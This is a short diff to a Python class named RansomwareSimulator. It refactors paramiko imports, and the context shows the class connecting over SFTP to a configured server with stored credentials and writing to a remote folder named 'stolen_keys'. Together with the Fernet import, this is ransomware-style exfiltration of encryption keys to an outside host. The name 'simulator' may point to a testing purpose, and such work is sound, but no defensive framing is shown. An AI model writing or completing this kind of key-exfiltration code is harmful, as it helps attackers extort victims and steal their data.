@@ -8,7 +8,7 @@ import socket
 import subprocess
 import sys
 import time
-import paramiko
+from paramiko import SFTPClient, Transport
 from cryptography.fernet import Fernet
 
 # Configuration initiale
@@ -71,9 +71,9 @@ class RansomwareSimulator:
             return False
 
         try:
-            transport = paramiko.Transport((self.sftp_config['server'], self.sftp_config['port']))
+            transport = Transport((self.sftp_config['server'], self.sftp_config['port']))
             transport.connect(username=self.sftp_config['user'], password=self.sftp_config['password'])
-            sftp = paramiko.SFTPClient.from_transport(transport)
+            sftp = SFTPClient.from_transport(transport)
 
             remote_dir = f"/home/{self.sftp_config['user']}/stolen_keys"
             try:
